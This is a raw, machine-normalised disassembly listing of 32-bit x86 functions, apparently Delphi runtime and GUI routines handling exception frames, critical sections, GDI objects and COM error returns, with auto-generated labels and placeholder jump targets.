push sub_417e3b
lea eax [ ebp - 0xc ]
call sub_403e9c
retn
sub_417e34
jmp sub_4038a0
sub_417e3b
mov esp ebp
pop ebp
retn
sub_417e8b
jmp sub_4038a0
sub_417e92
pop esi
pop ecx
pop ebp
retn
sub_417ee5
jmp sub_4038a0
sub_417eec
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_417ef4
retn
sub_417f6f
jmp sub_4038a0
sub_417f76
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_418013
jmp sub_4038a0
sub_41801a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418037
lea eax [ ebp - 0x8 ]
call sub_403e9c
retn
sub_418030
jmp sub_4038a0
sub_418037
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41803c
retn
sub_4180b6
jmp sub_4038a0
sub_4180bd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4180c4
mov eax edx
mov edx ecx
call sub_407d30
retn
sub_4180d0
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_4180e8
sub_418160
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_4181d0
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_4181ec
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_4183e0
mov eax [ eax + 0x18 ]
retn
sub_4183e4
mov eax [ eax + 0x14 ]
retn
sub_418480
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_41868c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_402774
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_4186c8
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_4186e0
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_4186f4
mov edx sub_4186e0
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_41873c
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_407d30
retn
mov eax edx
mov edx ecx
call sub_407cf8
retn
sub_4187d8
retn
sub_418ad0
jmp sub_4038a0
sub_418ad7
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_418b38
jmp sub_4038a0
sub_418b3f
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_418b84
mov eax [ eax + 0x4 ]
call sub_4082a8
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_418b94
mov eax [ eax + 0x4 ]
call sub_4082d4
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_418bd0
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_418d79
jmp sub_4038a0
sub_418dd8
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_418e68
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_418eb8
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_4190a3
jmp sub_4038a0
sub_4190aa
mov esp ebp
pop ebp
retn
sub_419154
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
call sub_4038d8
retn
sub_4191dc
mov [ eax + 0x18 ] edx
retn
sub_419358
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_413968
retn
sub_4193df
jmp sub_4038a0
sub_4193e6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_419492
jmp sub_4038a0
sub_419499
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41963d
jmp sub_4038a0
sub_41968f
jmp sub_4038a0
sub_4196ae
jmp sub_4038a0
sub_4196b5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4196d4
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_4196cd
jmp sub_4038a0
sub_4196d4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419777
jmp sub_4038a0
sub_4197ff
jmp sub_4038a0
sub_41980c
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
call sub_4038d8
pop ebx
retn
sub_419824
mov eax [ rw-data ]
call sub_41980c
retn
sub_41985c
push ebx
call sub_413820
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_419824
sub_4199c9
jmp sub_4038a0
sub_4199d0
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_403e9c
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_419af0
jmp sub_4038a0
sub_419af7
pop edi
pop esi
pop ebx
pop ebp
retn
sub_419bee
jmp sub_4038a0
sub_419c0b
jmp sub_4038a0
sub_419c12
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419d10
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_418758
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_419dd4
push ebx
mov ebx eax
mov eax ebx
call sub_41b788
cmp al 0x9
sete al
pop ebx
retn
sub_419e33
jmp sub_4038a0
sub_419e3a
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_419ee0
jmp sub_4038a0
sub_419ee7
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_419f00
jmp eax
sub_41a166
jmp sub_4035ec
sub_41a192
jmp sub_4035ec
sub_41a234
jmp sub_4035ec
sub_41a2d7
jmp sub_4035ec
sub_41a4af
jmp sub_4035ec
sub_41a4f1
jmp sub_4038a0
sub_41a521
jmp sub_4038a0
sub_41a528
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a597
jmp sub_4038a0
sub_41a66e
jmp sub_4038a0
sub_41a675
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a948
mov dl 0x1
call sub_4198b0
retn
sub_41aa80
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_41aa89
jmp sub_4038a0
j_sub_41aa80
jmp sub_41aa80
sub_41aa90
pop ebx
mov esp ebp
pop ebp
retn
sub_41aa98
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41b898
mov eax [ rw-data ]
call sub_41980c
pop ebp
retn
j_sub_403718#2
jmp sub_403718
j_sub_403718
jmp sub_403718
sub_41ac84
jmp sub_4038a0
sub_41ac8b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ad6b
jmp sub_4038a0
sub_41ad72
mov esp ebp
pop ebp
retn
sub_41ae2a
jmp sub_4038a0
sub_41ae31
pop ecx
pop ecx
pop ebp
retn
sub_41b133
jmp sub_4038a0
sub_41b13a
pop ebx
mov esp ebp
pop ebp
retn
sub_41b3df
jmp sub_4038a0
sub_41b3e6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_403164
retn
sub_41b3ff
jmp sub_4038a0
sub_41b423
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_4035ec
sub_41b45a
jmp sub_4035ec
sub_41b499
jmp sub_4038a0
sub_41b4a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b4c2
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_403ec0
retn
sub_41b4bb
jmp sub_4038a0
sub_41b4c2
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b549
jmp sub_4035ec
sub_41b576
jmp sub_4038a0
sub_41b57d
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41b588
push ecx
mov edx esp
mov ecx 0x4
call sub_419d4c
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_41980c
sub_41b695
jmp sub_4038a0
sub_41b69c
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41b77b
jmp sub_4038a0
sub_41b782
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b7d8
jmp sub_4038a0
sub_41b7df
pop ebx
pop ecx
pop ebp
retn
sub_41ba27
jmp sub_4038a0
sub_41ba2e
pop ecx
pop ecx
pop ebp
retn
sub_41ba71
jmp sub_4038a0
sub_41ba78
pop ebx
pop ecx
pop ebp
retn
sub_41bb14
jmp sub_4038a0
sub_41bb1b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41bbc9
jmp sub_4038a0
sub_41bbd0
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41bbdc
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_41be37
jmp sub_4038a0
sub_41be3e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41be63
mov eax [ ebp - 0x8 ]
call sub_403164
mov eax [ ebp - 0x4 ]
call sub_403164
retn
sub_41be5c
jmp sub_4038a0
sub_41be63
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41be88
lea eax [ ebp - 0x1c ]
call sub_40575c
lea eax [ ebp - 0x18 ]
call sub_403e9c
retn
sub_41be81
jmp sub_4038a0
sub_41be88
pop ebx
mov esp ebp
pop ebp
retn
sub_41c09a
jmp sub_4038a0
sub_41c0a1
pop ebx
mov esp ebp
pop ebp
retn
sub_41c0f4
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_4189bc
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_41c10c
test dl dl
je r-xdata
mov dl 0x8
call sub_41c290
retn
mov dl 0x9
call sub_41c290
retn
sub_41c194
mov dl 0x1
call sub_41c290
retn
sub_41c19c
xor edx edx
call sub_41c290
retn
sub_41c281
jmp sub_4038a0
sub_41c288
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41c2a4
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40c7f0
sub_41c2d8
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_41c2f0
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_41c2fc
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_41c2f0
sub_41c422
jmp sub_4035ec
sub_41c451
jmp sub_4038a0
sub_41c487
jmp sub_4038a0
sub_41c48e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c4ad
push rw-data
call LeaveCriticalSection
retn
sub_41c4a6
jmp sub_4038a0
sub_41c4ad
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c57c
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_41c758
sub_41c5dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41a898
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_41c5f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41a898
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_41c604
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_41c120
retn
sub_41c610
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_41c120
retn
sub_41c8b8
xor eax eax
retn
sub_41c8bc
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_41c8c4
xor eax eax
retn
sub_41c8c8
retn
sub_41c8cc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403ef0
pop esi
pop ebx
retn
sub_41c8e0
mov eax [ eax + 0x4 ]
retn
sub_41c8e4
retn
sub_41c8e8
xor eax eax
retn
sub_41c8ec
retn
sub_41c8f0
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_41c8fc
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_41c908
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_41c914
retn
sub_41c918
xchg edx eax
call sub_41a53c
retn
sub_41c920
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_41c9a8
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_403360
pop esi
retn
sub_41c9bc
retn
sub_41ca9c
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403ef0
pop esi
pop ebx
retn
sub_41cadc
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_41cc28
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_403394
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_41cc40
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_41ccc8
retn
sub_41cd10
retn
sub_41cd48
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_41cd60
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41cf84
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_403360
pop esi
pop ebx
retn
sub_41cda8
mov al 0x1
retn
sub_41cdac
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_41cdb4
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_41ce5c
xor eax eax
retn
sub_41ce60
retn
sub_41ce8c
retn
sub_41cf24
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_41cf38
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_4169bc
retn
sub_41d07f
jmp sub_4035ec
sub_41d084
mov ebx 0x1
call sub_403954
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41d0e7
jmp sub_4035ec
sub_41d0ec
mov ebx 0x80030103
call sub_403954
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41d16a
jmp sub_4035ec
sub_41d16f
mov ebx 0x80030009
call sub_403954
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_41d1cd
jmp sub_4035ec
sub_41d1d2
mov ebx 0x8000ffff
call sub_403954
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41d39d
jmp sub_4038a0
sub_41d3ae
jmp sub_4035ec
sub_41d3b3
mov [ ebp - 0x4 ] 0x8000ffff
call sub_403954
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d3dc
lea eax [ ebp + 0xc ]
call sub_40575c
retn
sub_41d3d5
jmp sub_4038a0
sub_41d3dc
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_41d3e8
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_41d3f4
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_41d400
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41d40c
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41d47b
jmp sub_4035ec
sub_41d480
mov esi 0x8000ffff
call sub_403954
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41d494
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_41d501
jmp sub_4038a0
sub_41d508
mov eax [ rw-data ]
call sub_403164
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41d518
call sub_416308
retn
sub_41d5e0
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_41d784
jmp sub_4038a0
sub_41d78b
pop ebp
retn
sub_41d819
jmp sub_4038a0
sub_41d820
pop ebp
retn
sub_41daa1
jmp sub_4038a0
sub_41daa8
pop ebp
retn
sub_41daac
sub [ rw-data ] 0x1
retn
sub_41e764
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_41e7d8
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_41e84c
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_41e858
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_41e938
jmp sub_4038a0
sub_41e93f
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41e9cf
jmp sub_4038a0
sub_41ea61
jmp sub_4038a0
sub_41ea68
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41eacc
jmp sub_4038a0
sub_41ead3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41eb3b
jmp sub_4038a0
sub_41eb42
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41ebe5
jmp sub_4038a0
sub_41ebec
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f044
push 0x33
mov ecx rw-data
call sub_4165c8
retn
sub_41f054
push 0x33
mov ecx rw-data
call sub_416588
retn
sub_41f064
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_41f088
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_41f25c
push 0x11
mov ecx rw-data
call sub_416588
retn
sub_41f39c
push ebx
mov ebx eax
mov eax ebx
call sub_41f064
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_41f456
jmp sub_4038a0
sub_41f45d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f088
retn
sub_41f473
jmp sub_4038a0
sub_41f48c
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41f4e9
jmp sub_4038a0
sub_41f4f0
pop ebx
pop ecx
pop ebp
retn
sub_41f669
jmp sub_4038a0
sub_41f691
jmp sub_4038a0
sub_41f698
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41f704
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_404100
pop esi
pop ebx
retn
sub_41f778
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_41f6d4
push eax
call MulDiv
neg eax
pop ebx
retn
sub_41f7b4
mov eax [ eax + 0x10 ]
mov dl [ eax + 0x19 ]
mov eax edx
retn
sub_41f7ec
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_41f81c
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_41f93a
jmp sub_4038a0
sub_41f941
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f088
retn
sub_41f957
jmp sub_4038a0
sub_41f9cd
jmp sub_4038a0
sub_41f9d4
pop ebx
pop ecx
pop ebp
retn
sub_41f9d8
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_41fa8e
jmp sub_4038a0
sub_41faa0
push esi
cmp dl [ eax + 0x18 ]
je r-xdata
pop esi
retn
mov [ eax + 0x18 ] dl
mov si 0xfffd
call sub_403360
sub_41fab4
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_41fae4
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_41fbf3
jmp sub_4038a0
sub_41fbfa
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f088
retn
sub_41fc10
jmp sub_4038a0
sub_41fc89
jmp sub_4038a0
sub_41fc90
pop ebx
pop ecx
pop ebp
retn
sub_41fdc1
jmp sub_4038a0
sub_41fdd4
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_420114
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_4202a8
jmp sub_4038a0
sub_4202af
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_4202b8
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_4202f0
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4202fc
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_42043c
retn
sub_420505
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_42051c
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_420608
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_420628
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_420648
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_420668
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
call sub_4038d8
pop ebx
retn
sub_420680
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
call sub_4038d8
pop ebx
retn
sub_4206a4
mov eax [ rw-data ]
call sub_420680
retn
sub_4206fa
jmp sub_4038a0
sub_420701
pop ecx
pop ebp
retn
sub_4207a0
jmp sub_4038a0
sub_4207a7
pop ebx
mov esp ebp
pop ebp
retn
sub_420879
jmp sub_4038a0
sub_42090a
jmp sub_4038a0
sub_420911
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42093c
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_420a23
jmp sub_4038a0
sub_420bd0
jmp sub_4038a0
sub_420bd7
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_420de9
jmp sub_4038a0
sub_420df0
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_420e8a
jmp sub_4038a0
sub_421066
jmp sub_4038a0
sub_421120
jmp sub_4038a0
sub_421127
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421147
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_421140
jmp sub_4038a0
sub_421147
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4212d5
jmp sub_4038a0
sub_4214a0
jmp sub_4038a0
sub_4214a7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4214ca
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_402754
retn
sub_4214c3
jmp sub_4038a0
sub_4214ca
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4214ea
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_402754
retn
sub_4214e3
jmp sub_4038a0
sub_4214ea
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_42163c
push 0x0
call sub_4215d8
retn
sub_4216e1
jmp sub_4038a0
sub_4216e8
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4216f4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_421644
pop ebx
pop ebp
retn 0x4
sub_421708
retn
sub_42170c
test eax eax
jne r-xdata
retn
call sub_421708
sub_4218df
jmp sub_4038a0
sub_421906
jmp sub_4038a0
sub_42190d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42194c
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_421b19
mov eax [ ebp - 0xc ]
call sub_403164
retn
sub_421b22
jmp sub_4038a0
j_sub_421b19
jmp sub_421b19
sub_421b29
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403164
retn
sub_421b3f
jmp sub_4038a0
sub_421b50
xor eax eax
retn
sub_421b54
mov al [ eax + 0x21 ]
retn
sub_421ba0
jmp sub_4038a0
sub_421ba7
pop esi
pop ecx
pop ebp
retn
sub_421bd4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_421c2b
jmp sub_4038a0
sub_421c32
pop esi
pop ecx
pop ebp
retn
sub_421c38
retn
sub_421c3c
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_421c4c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_421d6a
jmp sub_4038a0
sub_421d92
jmp sub_4038a0
sub_421d99
mov esp ebp
pop ebp
retn
sub_421e10
jmp sub_4038a0
sub_421f18
jmp sub_4038a0
sub_422003
jmp sub_4038a0
sub_422010
inc [ eax + 0x4 ]
retn
sub_42218b
jmp sub_4038a0
sub_42253c
jmp sub_4038a0
sub_422786
jmp sub_4038a0
sub_4227b0
jmp sub_4038a0
sub_4227b7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4227d9
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_4227d2
jmp sub_4038a0
sub_4227e3
jmp sub_4035ec
sub_422832
jmp sub_4038a0
sub_422a5f
jmp sub_4038a0
sub_422aa7
jmp sub_4038a0
sub_422c14
jmp sub_4038a0
sub_422cdb
jmp sub_4035ec
sub_422d30
mov [ eax + 0x31 ] 0x0
call sub_42194c
retn
sub_422f81
jmp sub_4038a0
sub_422fec
jmp sub_4038a0
sub_422ff3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
